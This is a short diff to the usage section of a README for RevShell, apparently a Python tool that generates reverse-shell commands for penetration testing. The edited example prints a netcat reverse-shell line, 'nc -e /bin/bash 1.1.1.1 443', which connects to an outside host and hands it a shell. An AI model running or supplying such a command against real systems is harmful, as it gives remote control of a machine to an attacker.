@@ -12,7 +12,7 @@ RevShell is a Python-based tool that was built to have a variety of shells all i
   will give you a list of the shells that are available at the moment.   
         Once you see a shell you want, use -t or --type and the shell name to invoke it.
   
-  `python3 revshells.py -i 1.1.1.1 -p 443 -t bash`  
+  `python3 revshells.py -i 1.1.1.1 -p 443 -t netcat`  
     output: `nc -e /bin/bash 1.1.1.1 443`
 
  `--encode or -e` is entirely optional.  
